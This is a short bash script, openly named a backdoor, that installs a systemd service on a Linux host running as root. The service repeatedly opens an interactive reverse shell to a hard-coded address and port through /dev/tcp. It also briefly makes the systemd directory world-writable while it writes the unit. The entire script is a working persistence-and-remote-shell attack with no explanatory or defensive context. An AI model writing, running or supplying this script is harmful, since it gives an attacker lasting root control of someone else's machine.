#!/bin/bash

# Requires root access

IP="10.2.45.121"
PORT="7000"

chmod 777 /etc/systemd/system

echo -e "[Unit]
Description=My Exclusive Backdoor Service (Root)

[Service]
Type=simple
ExecStart=/bin/bash -c \"while [ 1 ]; do /bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1; sleep 10; done\"

[Install]
WantedBy=multi-user.target
" > /etc/systemd/system/backdoor-root.service

systemctl enable backdoor-root
systemctl start backdoor-root

chmod 751 /etc/systemd/system
